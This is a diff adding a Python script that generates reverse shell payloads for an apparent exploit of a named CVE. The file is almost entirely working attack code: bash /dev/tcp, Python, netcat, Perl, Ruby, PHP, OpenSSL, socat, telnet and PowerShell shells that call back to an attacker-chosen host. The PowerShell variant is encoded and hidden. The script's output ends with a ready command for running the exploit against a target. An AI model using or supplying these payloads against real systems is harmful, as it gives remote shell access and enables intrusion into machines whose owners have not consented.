@@ -1,0 +1,223 @@
+#!/usr/bin/env python3
+"""
+shell_payloads.py — Reverse shell payload generator for CVE-2026-42945
+
+Generates payload strings compatible with the exploit's --cmd flag.
+Supports multiple shell types and callback protocols.
+
+Usage:
+  python3 shell_payloads.py --type bash --host 172.17.0.1 --port 1337
+  python3 shell_payloads.py --type python --host 10.0.0.5 --port 4444
+  python3 shell_payloads.py --type nc --host 192.168.1.100 --port 9999
+  python3 shell_payloads.py --type all --host 172.17.0.1 --port 1337
+  python3 shell_payloads.py --type cmdlist --host 172.17.0.1 --port 1337
+"""
+
+import argparse
+import base64
+import sys
+
+
+def payload_bash(host, port):
+    """Bash reverse shell — /dev/tcp variant."""
+    return [
+        f"bash -c 'exec bash -i &>/dev/tcp/{host}/{port} <&1'",
+        f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'",
+        f"0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196",
+    ]
+
+
+def payload_python(host, port):
+    """Python reverse shell."""
+    code = (
+        f"import socket,subprocess,os;"
+        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+        f"s.connect(('{host}',{port}));"
+        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+        f"os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+    )
+    return [
+        f"python3 -c '{code}'",
+        f"python -c '{code}'",
+        (
+            f"python3 -c \"$(echo {base64.b64encode(code.encode()).decode()}"
+            f" | base64 -d)\""
+        ),
+    ]
+
+
+def payload_nc(host, port):
+    """Netcat reverse shell."""
+    return [
+        f"nc -e /bin/sh {host} {port}",
+        f"nc -e /bin/bash {host} {port}",
+        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
+        f"ncat {host} {port} -e /bin/sh",
+    ]
+
+
+def payload_perl(host, port):
+    """Perl reverse shell."""
+    return [
+        (
+            f"perl -e 'use Socket;"
+            f"$i=\"{host}\";$p={port};"
+            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
+            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");"
+            f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
+        ),
+    ]
+
+
+def payload_ruby(host, port):
+    """Ruby reverse shell."""
+    code = (
+        f"c=TCPSocket.new(\"{host}\",{port});"
+        f"$stdin.reopen(c);$stdout.reopen(c);"
+        f"$stderr.reopen(c);$stdin.each_line{{|l|l=l.chomp;"
+        f"break if l==\"exit\";"
+        f"IO.popen(l,\"r\"){{|io|c.print io.read}}}}"
+    )
+    return [
+        f"ruby -rsocket -e '{code}'",
+    ]
+
+
+def payload_php(host, port):
+    """PHP reverse shell."""
+    code = (
+        f"$s=fsockopen(\"{host}\",{port});"
+        f"exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+    )
+    return [
+        f"php -r '{code}'",
+    ]
+
+
+def payload_openssl(host, port):
+    """OpenSSL reverse shell (requires certificate)."""
+    return [
+        f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | "
+        f"openssl s_client -quiet -connect {host}:{port} > /tmp/s; rm /tmp/s",
+    ]
+
+
+def payload_socat(host, port):
+    """Socat reverse shell."""
+    return [
+        f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
+        f"tcp:{host}:{port}",
+    ]
+
+
+def payload_telnet(host, port):
+    """Telnet reverse shell."""
+    return [
+        f"rm -f /tmp/p; mknod /tmp/p p && telnet {host} {port} 0</tmp/p | "
+        f"/bin/sh 1>/tmp/p",
+    ]
+
+
+def payload_powershell(host, port):
+    """PowerShell reverse shell (for Windows targets)."""
+    code = (
+        f"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});"
+        f"$stream = $client.GetStream();"
+        f"[byte[]]$bytes = 0..65535|%{{0}};"
+        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
+        f"{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding)"
+        f".GetString($bytes,0, $i);"
+        f"$sendback = (iex $data 2>&1 | Out-String );"
+        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
+        f"$stream.Flush()}};$client.Close()"
+    )
+    encoded = base64.b64encode(code.encode('utf-16le')).decode()
+    return [
+        f"powershell -NoP -NonI -W Hidden -Exec Bypass "
+        f"-Enc {encoded}",
+        f"powershell -c \"{code}\"",
+    ]
+
+
+def payload_cmdlist(host, port):
+    """Output a machine-readable command list for automation."""
+    results = []
+    for name, func in PAYLOADS.items():
+        if name == "cmdlist" or name == "all":
+            continue
+        for payload in func(host, port):
+            results.append({"type": name, "payload": payload})
+    return results
+
+
+PAYLOADS = {
+    "bash": payload_bash,
+    "python": payload_python,
+    "nc": payload_nc,
+    "perl": payload_perl,
+    "ruby": payload_ruby,
+    "php": payload_php,
+    "openssl": payload_openssl,
+    "socat": payload_socat,
+    "telnet": payload_telnet,
+    "powershell": payload_powershell,
+    "cmdlist": payload_cmdlist,
+    "all": lambda h, p: [pl for _, fn in list(PAYLOADS.items())[:-2]
+                          for pl in fn(h, p)],
+}
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Generate reverse shell payloads for CVE-2026-42945"
+    )
+    parser.add_argument("--type", choices=list(PAYLOADS.keys()), default="python",
+                        help="Payload type")
+    parser.add_argument("--host", default="172.17.0.1",
+                        help="Callback host/IP")
+    parser.add_argument("--port", type=int, default=1337,
+                        help="Callback port")
+    parser.add_argument("--list", action="store_true",
+                        help="List available payload types")
+    parser.add_argument("--limit", type=int, default=0,
+                        help="Limit number of payloads per type (all types)")
+    args = parser.parse_args()
+
+    if args.list:
+        print("Available payload types:")
+        for name in PAYLOADS:
+            if name in ("cmdlist", "all"):
+                continue
+            print(f"  {name:15s} — {PAYLOADS[name].__doc__.strip()}")
+        return 0
+
+    if args.type == "cmdlist":
+        results = payload_cmdlist(args.host, args.port)
+        import json
+        print(json.dumps(results, indent=2))
+        return 0
+
+    payload_func = PAYLOADS[args.type]
+    payloads = payload_func(args.host, args.port)
+
+    if args.limit > 0:
+        payloads = payloads[:args.limit]
+
+    print(f"# Reverse shell payloads ({args.type} → {args.host}:{args.port})")
+    print(f"# {'='*60}")
+    for i, p in enumerate(payloads, 1):
+        print(f"\n[{i}] {p}")
+    print(f"\n# Total: {len(payloads)} payload(s)")
+
+    print(f"\n# Use with exploit.py:")
+    print(f"python3 scripts/exploit.py --host TARGET --port 19321 "
+          f"--cmd \"{payloads[0]}\"")
+
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
